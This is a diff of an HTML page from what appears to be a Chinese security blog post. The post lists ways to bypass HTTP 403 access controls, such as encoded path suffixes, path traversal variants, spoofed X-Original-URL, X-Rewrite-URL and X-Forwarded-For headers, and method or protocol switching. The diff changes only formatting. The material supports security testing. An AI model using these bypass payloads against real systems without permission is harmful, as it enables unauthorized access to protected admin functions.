@@ -29,22 +29,24 @@
         <hr>
     </div>
     <div class="post-content">
-        <p>平时我们做安全测试的时候可能会经常遇到403页面，按常规的思路就是扫目录，扫扫文件。我也曾用这种暴力的方式发现了不少的漏洞。</p>
-<p>前些天逛推特的时候看到还可以用如下的方式去绕过页面权限控制，在此记录学习一番。</p>
-<p>You can try to bypass it , Good luck.</p>
-<h3 id="Bypass-403"><a href="#Bypass-403" class="headerlink" title="Bypass 403"></a>Bypass 403</h3><p><code>target.com/admin  → 403</code></p>
-<p><strong>（1）使用空格符绕过(<em>From Hack3rScr0lls</em>)</strong></p>
+        <p>​        平时我们做安全测试的时候可能会经常遇到403页面，按常规的思路就是扫目录，扫扫文件。我也曾用这种暴力的方式发现了不少的漏洞。</p>
+<p>​        前些天逛推特的时候看到还可以用如下的方式去绕过页面权限控制，在此记录学习一番。</p>
+<p>​        You can try to bypass it , Good luck.</p>
+<h3 id="Bypass-403"><a href="#Bypass-403" class="headerlink" title="Bypass 403"></a>Bypass 403</h3><blockquote>
+<p><strong>target.com/admin  → 403</strong></p>
+</blockquote>
+<p><strong>(1)使用空格符绕过(<em>From Hack3rScr0lls</em>)</strong></p>
 <ul>
 <li>target.com/admin%20  → 200</li>
 <li>target.com/admin%09  → 200</li>
 </ul>
-<p><strong>（2）使用路径遍历绕过(<em>From Hack3rScr0lls</em>)</strong></p>
+<p><strong>(2)使用路径遍历绕过(<em>From Hack3rScr0lls</em>)</strong></p>
 <ul>
 <li>target.com/admin/..;/  → 200</li>
 <li>target.com/static../admin.jsp  → 200</li>
 <li>target.com/%2e/admin/  → 200</li>
 </ul>
-<p><strong>（3）添加干扰符号</strong></p>
+<p><strong>(3)添加干扰符号</strong></p>
 <ul>
 <li>target.com/admin/  → 200</li>
 <li>target.com/admin#  → 200</li>
@@ -56,24 +58,24 @@
 <li>target.com/admin/anything  → 200</li>
 <li>target.com/admin/?anything  → 200</li>
 </ul>
-<p><strong>（4）添加X-Rewrite-URL头</strong></p>
+<p><strong>(4)添加X-Rewrite-URL头</strong></p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html</span><br><span class="line">...</span><br><span class="line"><span class="attribute">X-Rewrite-URL</span>: /admin</span><br></pre></td></tr></table></figure>
 
-<p><strong>（5）添加X-Real-IP和X-Forwarded-For头</strong></p>
+<p><strong>(5)添加X-Real-IP和X-Forwarded-For头</strong></p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /admin</span><br><span class="line">...</span><br><span class="line"><span class="attribute">X-Real-IP</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line">(admin页面可能只接收本地IP请求)</span><br></pre></td></tr></table></figure>
 
-<p><strong>（6）添加X-Original-URL头</strong>（From jae_hak99）</p>
+<p><strong>(6)添加X-Original-URL头（From jae_hak99）</strong></p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/deleteUser HTTP/1.1  → 403</span><br></pre></td></tr></table></figure>
 
-<p>​     👇</p>
+<p>👇</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line">...</span><br><span class="line"><span class="attribute">X-Original-URL</span>: /admin/deleteUser  → 200</span><br></pre></td></tr></table></figure>
 
-<p><strong>（7）改变请求方法</strong></p>
+<p><strong>(7)改变请求方法</strong></p>
 <ul>
 <li>Get（403） -&gt; Post（200） </li>
 <li>Post （403）-&gt; Get（200）</li>
 </ul>
-<p><strong>（8）改变请求协议</strong></p>
+<p><strong>(8)改变请求协议</strong></p>
 <ul>
 <li>Https（403） -&gt; Http（200） </li>
 <li>Http（403）  -&gt; Https（200）</li>
